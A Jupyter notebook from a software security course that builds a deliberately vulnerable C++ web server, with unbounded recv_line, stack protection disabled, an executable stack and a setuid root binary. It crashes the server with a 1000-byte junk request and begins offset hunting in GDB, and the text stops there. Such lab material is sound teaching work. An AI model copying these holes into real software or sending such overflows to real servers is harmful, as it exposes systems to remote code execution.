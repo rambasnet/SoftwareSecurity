{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# A Tiny Web Server & Its Exploitation\n",
    "\n",
    "- Web Server concept and some code based on the book `Hacking - The Art of Exploitation 2nd Edition by Jon Erickson`\n",
    "- similar to simple server but uses HTTP protocol to communicate; hence called Web Server\n",
    "- handles HTTP GET and HEAD requests\n",
    "- looks for the requested resource in the local directory callled `webroot` and sends it to the client/browser\n",
    "- if the file/resource is not found, the server responds with 404 HTTP (`File Not Found`) error in response\n",
    "- a tiny web server that serves static html webpage\n",
    "- see `demos/server/tinyweb`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SoftwareSecurity/notebooks'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# check the working directory\n",
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/server/tinyweb\n"
     ]
    }
   ],
   "source": [
    "%cd ../demos/server/tinyweb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "docker-compose.yaml  main.cpp\t  port_bind_exploit.bin    webroot\r\n",
      "Dockerfile\t     main.o\t  port_bind_shellcode.bin\r\n",
      "exploit.py\t     Makefile\t  tinyweb.exe\r\n",
      "junk.txt\t     pattern.txt  util\r\n"
     ]
    }
   ],
   "source": [
    "# list files and folders from current working directory\n",
    "! ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include \"./util/utility.h\"\r\n",
      "#include \"./util/net_utility.h\"\r\n",
      "\r\n",
      "enum REQUEST_TYPE {GET, POST, HEAD, UNKNOWN};\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define PORT 80   // the port users will be connecting to\r\n",
      "#define WEBROOT \"./webroot\" // the web server's root directory\r\n",
      "\r\n",
      "void handle_connection(int, struct sockaddr_in *); // handle web requests\r\n",
      "int get_file_size(int); // returns the filesize of open file descriptor\r\n",
      "void send_file_not_found(const int); // send file not found error\r\n",
      "void send_file(const int, char *, unsigned int); // send file/resource requested\r\n",
      "void send_buffer_address(const int, char *); // send buffer address\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "   int sockfd, new_sockfd, yes=1; \r\n",
      "   struct sockaddr_in host_addr, client_addr;   // my address information\r\n",
      "   socklen_t sin_size;\r\n",
      "\r\n",
      "   printf(\"Accepting web requests on port %d\\n\", PORT);\r\n",
      "\r\n",
      "   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "      fatal(\"in socket\");\r\n",
      "\r\n",
      "   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "      fatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\r\n",
      "   host_addr.sin_family = AF_INET;      // host byte order\r\n",
      "   host_addr.sin_port = htons(PORT);    // short, network byte order\r\n",
      "   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "   memset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "      fatal(\"binding to socket\");\r\n",
      "\r\n",
      "   if (listen(sockfd, 20) == -1)\r\n",
      "      fatal(\"listening on socket\");\r\n",
      "\r\n",
      "   while(1) {   // Accept loop\r\n",
      "      sin_size = sizeof(struct sockaddr_in);\r\n",
      "      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "      if(new_sockfd == -1)\r\n",
      "         fatal(\"accepting connection\");\r\n",
      "\r\n",
      "      handle_connection(new_sockfd, &client_addr);\r\n",
      "   }\r\n",
      "   return 0;\r\n",
      "}\r\n",
      "\r\n",
      "/* This function handles the connection on the passed socket from the\r\n",
      " * passed client address.  The connection is processed as a web request\r\n",
      " * and this function replies over the connected socket.  Finally, the \r\n",
      " * passed socket is closed at the end of the function.\r\n",
      " */\r\n",
      "void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\r\n",
      "\tchar *ptr, request[500];\r\n",
      "\tint length = 0;\r\n",
      "\tREQUEST_TYPE req_type = UNKNOWN;\r\n",
      "\t\r\n",
      "\tchar address[100];\r\n",
      "\tsnprintf(address, sizeof(address), \"Request buffer @ %p\\r\\n\", request);\r\n",
      "\tprintf(\"%s\", address);\r\n",
      "\t// receive one line from client and store it into request buffer\r\n",
      "\tlength = recv_line(sockfd, request);\r\n",
      "\r\n",
      "\tprintf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\r\n",
      "\tprintf(\"Received: %d bytes\\n\", length);\r\n",
      "\r\n",
      "\tptr = strstr(request, \" HTTP/\"); // search for valid looking request\r\n",
      "\tif(ptr == NULL) { // then this isn't valid HTTP\r\n",
      "\t\tprintf(\" NOT HTTP!\\n\");\r\n",
      "\t} \r\n",
      "\telse {\r\n",
      "\t\t*ptr = 0; // terminate the buffer at the end of the URL\r\n",
      "\t\tptr = NULL; // set ptr to NULL (used to flag for an invalid request)\r\n",
      "\t\tif(strncmp(request, \"GET \", 4) == 0) {  // get request\r\n",
      "\t\t\tptr = request+4; // ptr is the URL=\r\n",
      "\t\t\treq_type = GET;\r\n",
      "\t\t}\r\n",
      "\t\tif(strncmp(request, \"HEAD \", 5) == 0) { // head request\r\n",
      "\t\t \tptr = request+5; // ptr is the URL\r\n",
      "\t\t \treq_type = HEAD;\r\n",
      "\t\t}\r\n",
      "\r\n",
      "\t\tif(req_type == UNKNOWN) { //this is not a recognized request\r\n",
      "\t\t\tprintf(\"\\tUNKNOWN REQUEST!\\n\");\r\n",
      "\t\t} \r\n",
      "\t\telse if (req_type == GET) { // valid request, with ptr pointing to the resource name\r\n",
      "\t\t    if (strncmp(ptr, \"/buffer\", 7) == 0)\r\n",
      "\t\t        send_buffer_address(sockfd, address);\r\n",
      "\t\t    else\r\n",
      "\t\t\t\tsend_file(sockfd, ptr, sizeof(request));\r\n",
      "\t    }\r\n",
      "   } // end if block for valid HTTP\r\n",
      "   shutdown(sockfd, SHUT_RDWR); // close the socket gracefully\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts an open file descriptor and returns     \r\n",
      " * the size of the associated file.  Returns -1 on failure.\r\n",
      " */\r\n",
      "int get_file_size(int fd) {\r\n",
      "\tstruct stat stat_struct;\r\n",
      "\r\n",
      "\tif(fstat(fd, &stat_struct) == -1)\r\n",
      "\t\treturn -1;\r\n",
      "\treturn (int) stat_struct.st_size;\r\n",
      "}\r\n",
      "\r\n",
      "void send_file_not_found(const int sockfd) {\r\n",
      "\tprintf(\" 404 Not Found\\n\");\r\n",
      "\tsend_string(sockfd, \"HTTP/1.1 404 NOT FOUND\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\r\n",
      "\tsend_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\r\n",
      "}\r\n",
      "\r\n",
      "void send_file(const int sockfd, char *ptr, unsigned int ptr_size) {\r\n",
      "\t// handle GET request\r\n",
      "\tchar resource[500];\r\n",
      "\tint fd, length;\r\n",
      "\r\n",
      "\tif (ptr[strlen(ptr) - 1] == '/')  // for resources ending with '/'\r\n",
      "\t\tstrncat(ptr, \"index.html\", ptr_size);     // add 'index.html' to the end\r\n",
      "\tstrncpy(resource, WEBROOT, sizeof(resource)-1);     // begin resource with web root path\r\n",
      "\tstrncat(resource, ptr, sizeof(resource)-1);         //  and append resource path\r\n",
      "\r\n",
      "\tfd = open(resource, O_RDONLY, 0); // try to open the file\r\n",
      "\tprintf(\"\\tOpening \\'%s\\'\\t\", resource);\r\n",
      "\r\n",
      "\tif(fd == -1) { // if file is not found\r\n",
      "\t\tsend_file_not_found(sockfd);\r\n",
      "\t} \r\n",
      "\telse {      // otherwise, serve up the file\r\n",
      "\t\tprintf(\" 200 OK\\n\");\r\n",
      "\t\tsend_string(sockfd, \"HTTP/1.1 200 OK\\r\\n\");\r\n",
      "\t\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\t\t\r\n",
      "\t\tif( (length = get_file_size(fd)) == -1)\r\n",
      "\t\t\tfatal(\"getting resource file size\");\r\n",
      "\r\n",
      "\t\tptr = (char *) malloc(length);\r\n",
      "\t\tif(ptr == NULL)\r\n",
      "\t\t\tfatal(\"allocating memory for reading resource\");\r\n",
      "\r\n",
      "\t\tread(fd, ptr, length); // read the file into memory\r\n",
      "\t\tsend(sockfd, ptr, length, 0);  // send it to socket\r\n",
      "\t\tfree(ptr); // free file memory\r\n",
      "\t\tclose(fd); // close the file\r\n",
      "\t} // end if block for file found/not found\r\n",
      "}\r\n",
      "\r\n",
      "void send_buffer_address(const int sockfd, char *ptr) {\r\n",
      "    printf(\" 200 OK\\n\");\r\n",
      "\tsend_string(sockfd, \"HTTP/1.1 200 OK\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"<html><head><title>Request Buffer Address</title></head>\");\r\n",
      "\tchar response[200];\r\n",
      "\tsnprintf(response, sizeof(response), \"<body><p style=\\\"color: red;\\\">%s</p></body></html>\\r\\n\", ptr);\r\n",
      "\tsend_string(sockfd, response);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat main.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to the null terminated\r\n",
      " * string to send.  The function will make sure all the bytes of the\r\n",
      " * string are sent.  Returns 1 on success and 0 on failure.\r\n",
      " */\r\n",
      "int send_string(int sockfd, string buffer) {\r\n",
      "   int sent_bytes, bytes_to_send;\r\n",
      "   bytes_to_send = buffer.length();\r\n",
      "   while(bytes_to_send > 0) {\r\n",
      "      sent_bytes = send(sockfd, buffer.c_str(), bytes_to_send, 0);\r\n",
      "      if(sent_bytes == -1)\r\n",
      "         return 0; // return 0 on send error\r\n",
      "      bytes_to_send -= sent_bytes;\r\n",
      "      buffer += sent_bytes;\r\n",
      "   }\r\n",
      "   return 1; // return 1 on success\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to a destination\r\n",
      " * buffer.  It will receive from the socket until the EOL byte\r\n",
      " * sequence in seen.  The EOL bytes are read from the socket, but\r\n",
      " * the destination buffer is terminated before these bytes.\r\n",
      " * Returns the size of the read line (without EOL bytes).\r\n",
      " */\r\n",
      "int recv_line(int sockfd, char *dest_buffer) {\r\n",
      "#define EOL \"\\r\\n\" // End-Of-Line byte sequence\r\n",
      "#define EOL_SIZE 2\r\n",
      "   char *ptr;\r\n",
      "   int eol_matched = 0;\r\n",
      "\r\n",
      "   ptr = dest_buffer;\r\n",
      "   while(recv(sockfd, ptr, 1, 0) == 1) { // read a single byte\r\n",
      "      if(*ptr == EOL[eol_matched]) { // does this byte match terminator\r\n",
      "         eol_matched++;\r\n",
      "         if(eol_matched == EOL_SIZE) { // if all bytes match terminator,\r\n",
      "            *(ptr+1-EOL_SIZE) = '\\0'; // terminate the string\r\n",
      "            return strlen(dest_buffer); // return bytes recevied\r\n",
      "         }\r\n",
      "      } else {\r\n",
      "         eol_matched = 0;\r\n",
      "      }   \r\n",
      "      ptr++; // increment the pointer to the next byter;\r\n",
      "   }\r\n",
      "   return 0; // didn't find the end of line characters\r\n",
      "}\r\n",
      "\r\n",
      "\r\n",
      "/* Structure for Ethernet headers */\r\n",
      "#define ETHER_ADDR_LEN 6\r\n",
      "#define ETHER_HDR_LEN 14\r\n",
      "\r\n",
      "struct ether_hdr {\r\n",
      "   unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\r\n",
      "   unsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address\r\n",
      "   unsigned short ether_type; // Type of Ethernet packet\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Internet Protocol (IP) headers */\r\n",
      "struct ip_hdr {\r\n",
      "   unsigned char ip_version_and_header_length; // version and header length combined\r\n",
      "   unsigned char ip_tos;          // type of service\r\n",
      "   unsigned short ip_len;         // total length\r\n",
      "   unsigned short ip_id;          // identification number\r\n",
      "   unsigned short ip_frag_offset; // fragment offset and flags\r\n",
      "   unsigned char ip_ttl;          // time to live\r\n",
      "   unsigned char ip_type;         // protocol type\r\n",
      "   unsigned short ip_checksum;    // checksum\r\n",
      "   unsigned int ip_src_addr;      // source IP address\r\n",
      "   unsigned int ip_dest_addr;     // destination IP address\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Transmission Control Protocol (TCP) headers */\r\n",
      "struct tcp_hdr {\r\n",
      "   unsigned short tcp_src_port;   // source TCP port\r\n",
      "   unsigned short tcp_dest_port;  // destination TCP port\r\n",
      "   unsigned int tcp_seq;          // TCP sequence number\r\n",
      "   unsigned int tcp_ack;          // TCP acknowledgement number\r\n",
      "   unsigned char reserved:4;      // 4-bits from the 6-bits of reserved space\r\n",
      "   unsigned char tcp_offset:4;    // TCP data offset for little endian host\r\n",
      "   unsigned char tcp_flags;       // TCP flags (and 2-bits from reserved space)\r\n",
      "#define TCP_FIN   0x01\r\n",
      "#define TCP_SYN   0x02\r\n",
      "#define TCP_RST   0x04\r\n",
      "#define TCP_PUSH  0x08\r\n",
      "#define TCP_ACK   0x10\r\n",
      "#define TCP_URG   0x20\r\n",
      "   unsigned short tcp_window;     // TCP window size\r\n",
      "   unsigned short tcp_checksum;   // TCP checksum\r\n",
      "   unsigned short tcp_urgent;     // TCP urgent pointer\r\n",
      "};\r\n"
     ]
    }
   ],
   "source": [
    "! cat util/net_utility.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\r\n",
      "\t<head><title>A sample webpage</title>\r\n",
      "\t</head>\r\n",
      "\t<body bgcolor=\"#000000\" text=\"#ffffffff\">\r\n",
      "\t\t<center>\r\n",
      "\t\t\t<h1>Home<h1>\r\n",
      "\r\n",
      "\t\t\t<h3>This is a sample webpage....</h3>\r\n",
      "\r\n",
      "\t\t\t<p>...and this is a paragraph</p>\r\n",
      "\r\n",
      "\t\t\t<p>\r\n",
      "\t\t\t\tA simple link to <a href=\"http://example.com\" target=\"__blank\">Example.com</a>\r\n",
      "\t\t\t</p>\r\n",
      "\r\n",
      "\t\t\t<p>...and even a sample image:</p>\r\n",
      "\t\t\t<img src=\"image.jpg\"><br>\r\n",
      "\t\t</center>\r\n",
      "\t</body>\r\n",
      "</html>\r\n"
     ]
    }
   ],
   "source": [
    "! cat webroot/index.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to the null terminated\r\n",
      " * string to send.  The function will make sure all the bytes of the\r\n",
      " * string are sent.  Returns 1 on success and 0 on failure.\r\n",
      " */\r\n",
      "int send_string(int sockfd, string buffer) {\r\n",
      "   int sent_bytes, bytes_to_send;\r\n",
      "   bytes_to_send = buffer.length();\r\n",
      "   while(bytes_to_send > 0) {\r\n",
      "      sent_bytes = send(sockfd, buffer.c_str(), bytes_to_send, 0);\r\n",
      "      if(sent_bytes == -1)\r\n",
      "         return 0; // return 0 on send error\r\n",
      "      bytes_to_send -= sent_bytes;\r\n",
      "      buffer += sent_bytes;\r\n",
      "   }\r\n",
      "   return 1; // return 1 on success\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to a destination\r\n",
      " * buffer.  It will receive from the socket until the EOL byte\r\n",
      " * sequence in seen.  The EOL bytes are read from the socket, but\r\n",
      " * the destination buffer is terminated before these bytes.\r\n",
      " * Returns the size of the read line (without EOL bytes).\r\n",
      " */\r\n",
      "int recv_line(int sockfd, char *dest_buffer) {\r\n",
      "#define EOL \"\\r\\n\" // End-Of-Line byte sequence\r\n",
      "#define EOL_SIZE 2\r\n",
      "   char *ptr;\r\n",
      "   int eol_matched = 0;\r\n",
      "\r\n",
      "   ptr = dest_buffer;\r\n",
      "   while(recv(sockfd, ptr, 1, 0) == 1) { // read a single byte\r\n",
      "      if(*ptr == EOL[eol_matched]) { // does this byte match terminator\r\n",
      "         eol_matched++;\r\n",
      "         if(eol_matched == EOL_SIZE) { // if all bytes match terminator,\r\n",
      "            *(ptr+1-EOL_SIZE) = '\\0'; // terminate the string\r\n",
      "            return strlen(dest_buffer); // return bytes recevied\r\n",
      "         }\r\n",
      "      } else {\r\n",
      "         eol_matched = 0;\r\n",
      "      }   \r\n",
      "      ptr++; // increment the pointer to the next byter;\r\n",
      "   }\r\n",
      "   return 0; // didn't find the end of line characters\r\n",
      "}\r\n",
      "\r\n",
      "\r\n",
      "/* Structure for Ethernet headers */\r\n",
      "#define ETHER_ADDR_LEN 6\r\n",
      "#define ETHER_HDR_LEN 14\r\n",
      "\r\n",
      "struct ether_hdr {\r\n",
      "   unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\r\n",
      "   unsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address\r\n",
      "   unsigned short ether_type; // Type of Ethernet packet\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Internet Protocol (IP) headers */\r\n",
      "struct ip_hdr {\r\n",
      "   unsigned char ip_version_and_header_length; // version and header length combined\r\n",
      "   unsigned char ip_tos;          // type of service\r\n",
      "   unsigned short ip_len;         // total length\r\n",
      "   unsigned short ip_id;          // identification number\r\n",
      "   unsigned short ip_frag_offset; // fragment offset and flags\r\n",
      "   unsigned char ip_ttl;          // time to live\r\n",
      "   unsigned char ip_type;         // protocol type\r\n",
      "   unsigned short ip_checksum;    // checksum\r\n",
      "   unsigned int ip_src_addr;      // source IP address\r\n",
      "   unsigned int ip_dest_addr;     // destination IP address\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Transmission Control Protocol (TCP) headers */\r\n",
      "struct tcp_hdr {\r\n",
      "   unsigned short tcp_src_port;   // source TCP port\r\n",
      "   unsigned short tcp_dest_port;  // destination TCP port\r\n",
      "   unsigned int tcp_seq;          // TCP sequence number\r\n",
      "   unsigned int tcp_ack;          // TCP acknowledgement number\r\n",
      "   unsigned char reserved:4;      // 4-bits from the 6-bits of reserved space\r\n",
      "   unsigned char tcp_offset:4;    // TCP data offset for little endian host\r\n",
      "   unsigned char tcp_flags;       // TCP flags (and 2-bits from reserved space)\r\n",
      "#define TCP_FIN   0x01\r\n",
      "#define TCP_SYN   0x02\r\n",
      "#define TCP_RST   0x04\r\n",
      "#define TCP_PUSH  0x08\r\n",
      "#define TCP_ACK   0x10\r\n",
      "#define TCP_URG   0x20\r\n",
      "   unsigned short tcp_window;     // TCP window size\r\n",
      "   unsigned short tcp_checksum;   // TCP checksum\r\n",
      "   unsigned short tcp_urgent;     // TCP urgent pointer\r\n",
      "};\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./util/net_utility.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "# rule for compiling program\r\n",
      "\r\n",
      "COMPILER = g++\r\n",
      "COMPILER_FLAGS = -c -g -Wall -std=c++17 -m32\r\n",
      "BUILD_FLAGS = -m32 -fno-stack-protector -z execstack -no-pie\r\n",
      "\r\n",
      "# list .cpp files separated by space\r\n",
      "CPP_FILES = main.cpp\r\n",
      "\r\n",
      "# executable program name\r\n",
      "PROGRAM_NAME = tinyweb.exe\r\n",
      "\r\n",
      ".PHONY: all\r\n",
      "all: build run\r\n",
      "\r\n",
      "# rule for compiling and building program\r\n",
      "# make or make all triggers the following rule\r\n",
      ".PHONY: build\r\n",
      "build:\r\n",
      "\t# compiles .cpp to object file .o\r\n",
      "\t$(COMPILER) $(COMPILER_FLAGS) $(CPP_FILES)\r\n",
      "\t# builds executable from object files\r\n",
      "\t$(COMPILER) $(BUILD_FLAGS) -o $(PROGRAM_NAME) *.o\r\n",
      "\tchown root:root $(PROGRAM_NAME)\r\n",
      "\tchmod u+s $(PROGRAM_NAME)\r\n",
      "\r\n",
      "\r\n",
      "# rule for running programming\r\n",
      "# make run triggers the following rule\r\n",
      ".PHONY: run\r\n",
      "run:\r\n",
      "\t./$(PROGRAM_NAME)\r\n",
      "\r\n",
      "# rule for clean up\r\n",
      "# make clean triggers the following rule\r\n",
      ".PHONY: clean\r\n",
      "clean:\r\n",
      "\trm -f $(PROGRAM_NAME) *.o\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "! cat Makefile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "// A function to display an error message and then exit\r\n",
      "void fatal(string message) {\r\n",
      "   char error_message[100];\r\n",
      "\r\n",
      "   strcpy(error_message, \"[!!] Fatal Error \");\r\n",
      "   strncat(error_message, message.c_str(), 83);\r\n",
      "   perror(error_message);\r\n",
      "   exit(-1);\r\n",
      "}\r\n",
      "\r\n",
      "// An error checked malloc() wrapper function\r\n",
      "void *ec_malloc(unsigned int size) {\r\n",
      "   void *ptr;\r\n",
      "   ptr = malloc(size);\r\n",
      "   if(ptr == NULL)\r\n",
      "      fatal(\"in ec_malloc() on memory allocation\");\r\n",
      "   return ptr;\r\n",
      "}\r\n",
      "\r\n",
      "// dumps raw memory in hex byte and printable split format\r\n",
      "void dump(char *data_buffer, const unsigned int length) {\r\n",
      "\tunsigned char byte;\r\n",
      "\tunsigned int i, j;\r\n",
      "\tfor(i=0; i < length; i++) {\r\n",
      "\t\tbyte = data_buffer[i];\r\n",
      "\t\tprintf(\"%02x \", data_buffer[i]);  // display byte in hex\r\n",
      "\t\tif(((i%16)==15) || (i==length-1)) {\r\n",
      "\t\t\tfor(j=0; j < 15-(i%16); j++)\r\n",
      "\t\t\t\tprintf(\"   \");\r\n",
      "\t\t\tprintf(\"| \");\r\n",
      "\t\t\tfor(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line\r\n",
      "\t\t\t\tbyte = data_buffer[j];\r\n",
      "\t\t\t\tif((byte > 31) && (byte < 127)) // outside printable char range\r\n",
      "\t\t\t\t\tprintf(\"%c\", byte);\r\n",
      "\t\t\t\telse\r\n",
      "\t\t\t\t\tprintf(\".\");\r\n",
      "\t\t\t}\r\n",
      "\t\t\tprintf(\"\\n\"); // end of the dump line (each line 16 bytes)\r\n",
      "\t\t} // end if\r\n",
      "\t} // end for\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./util/utility.h"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Build and run Tinyweb Server in a Docker image\n",
    "\n",
    "- NOTE - don't build the tinyweb server in the Docker; disabling -fno-stack-protector is not working!\n",
    "- use provided `docker-compose` file that uses `Dockerfile` to build and run the image\n",
    "- compile tiny web server and run it using Makefile from Docker Terminal\n",
    "- access the IP address using the host browser\n",
    "- observe the log on the server\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker-compose --build up\n",
    "\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker container ls \n",
    "\n",
    "CONTAINER ID   IMAGE            COMMAND                  CREATED             STATUS             PORTS                               NAMES\n",
    "cc1590ca3f63   tinyweb_server   \"sh -c 'echo 0 > /pr…\"   About an hour ago   Up About an hour   0.0.0.0:80->80/tcp, :::80->80/tcp   tinyweb\n",
    "\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker exec -it tinyweb bash\n",
    "root@tinyweb:/var/www# ifconfig | grep inet\n",
    "        inet 192.168.100.100  netmask 255.255.240.0  broadcast 192.168.31.255\n",
    "        inet 127.0.0.1  netmask 255.0.0.0\n",
    "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n",
    "\n",
    "root@tinyweb:/var/www# make all\n",
    "# compiles .cpp to object file .o\n",
    "g++ -c -g -Wall -std=c++17 -m32 main.cpp\n",
    "# builds executable from object files\n",
    "g++ -m32 -fno-stack-protector -z execstack -no-pie -o tinyweb.exe *.o\n",
    "chown root:root tinyweb.exe\n",
    "chmod u+s tinyweb.exe\n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Got request from 192.168.16.1:44262 \"GET / HTTP/1.1\"\n",
    "Received: 14 bytes\n",
    "        Opening './webroot/index.html'   200 OK\n",
    "Got request from 192.168.16.1:44270 \"GET /image.jpg HTTP/1.1\"\n",
    "Received: 23 bytes\n",
    "        Opening './webroot/image.jpg'    200 OK\n",
    "Got request from 192.168.16.1:44286 \"GET /image.jpg\"\n",
    "Received: 0 bytes\n",
    " NOT HTTP!\n",
    " \n",
    " \n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ wget 192.168.100.100\n",
    "--2025-04-06 00:15:09--  http://192.168.16.2/\n",
    "Connecting to 192.168.100.100:80... connected.\n",
    "HTTP request sent, awaiting response... 200 OK\n",
    "Length: unspecified\n",
    "Saving to: ‘index.html.1’\n",
    "\n",
    "index.html.1                     [ <=>                                        ]     401  --.-KB/s    in 0s      \n",
    "\n",
    "2025-04-06 00:15:09 (42.6 MB/s) - ‘index.html.1’ saved [401]\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Server Stackoverflow Vulnerability & Exploitation\n",
    "\n",
    "- same concept as the previous stackoverflow vulnerability & exploitation\n",
    "- only difference is that the input data to buffer is coming from remote client via TCP/IP\n",
    "- server has stack overflow vulnerability in `recv_line(...)` of `util/net_utility.h` file\n",
    "\n",
    "#### Crash Tinyweb server\n",
    "\n",
    "- use a different VM or a machine (attacker machine)\n",
    "- generate a junk data of 1000 bytes and send it to the server\n",
    "- Web server's including Tinyweb server users `\\r\\n` as a delimeter to end the request string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'print(\"A\"*1000, end=\"\\r\\n\")' > junk.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! hexdump -C junk.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# count the number of bytes\n",
    "! wc -c junk.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### send junk\n",
    "- replace tinyserver ip and port\n",
    "- send the junk from different VM or system\n",
    "\n",
    "#### attacker machine\n",
    "\n",
    "```bash\n",
    "$ cat junk.txt | nc -v [tinyseverip] [port]\n",
    "```\n",
    "\n",
    "#### tiny webserver target\n",
    "\n",
    "```\n",
    "root@tinyweb:/var/www# make run\n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Request buffer @ 0xffffd400\n",
    "Got request from 192.168.144.1:50322 \"GET /buffer HTTP/1.1\"\n",
    "Received: 20 bytes\n",
    " 200 OK\n",
    "ls\n",
    "^HRequest buffer @ 0xffffd400\n",
    "make: *** [Makefile:29: run] Segmentation fault (core dumped)\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true
   },
   "source": [
    "## Pawn the Docker running Tinyweb server\n",
    "\n",
    "- find the overflow vulnerability\n",
    "- find the return address and offset from `request` buffer\n",
    "    - this will give us the length of the payload we need to build\n",
    "\n",
    "### Using GDB on a running process\n",
    "\n",
    "- download the opensource/binary and run it locally\n",
    "- run the `tinyweb.exe` and get its process id to attach it to the gdb\n",
    "- the second column is the process id\n",
    "\n",
    "- run the `tinyweb.exe` as a background process\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker exec -it tinyweb bash\n",
    "root@tinyweb:/var/www# ./tinyweb.exe &\n",
    "[1] 16 <--- this is the process id\n",
    "```\n",
    "\n",
